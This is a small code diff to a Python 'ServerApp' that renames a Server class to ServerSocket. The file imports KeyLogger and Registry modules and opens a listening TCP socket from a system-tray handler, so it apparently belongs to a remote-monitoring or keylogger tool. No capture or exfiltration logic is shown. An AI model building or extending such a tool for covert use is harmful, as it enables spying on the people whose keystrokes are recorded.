@@ -1,4 +1,4 @@
-from Server import Server
+from ServerSocket import ServerSocket
 from KeyLogger import KeyLogger
 from Window import OS
 from Registry import Registry
@@ -49,7 +49,7 @@ class ServerApp:
         )
 
     def open_server(self, sysTrayIcon):
-        self.server = Server(socket.AF_INET, socket.SOCK_STREAM)
+        self.server = ServerSocket(socket.AF_INET, socket.SOCK_STREAM)
         self.server.bind(ADDR)
         self.server.listen(1)
 
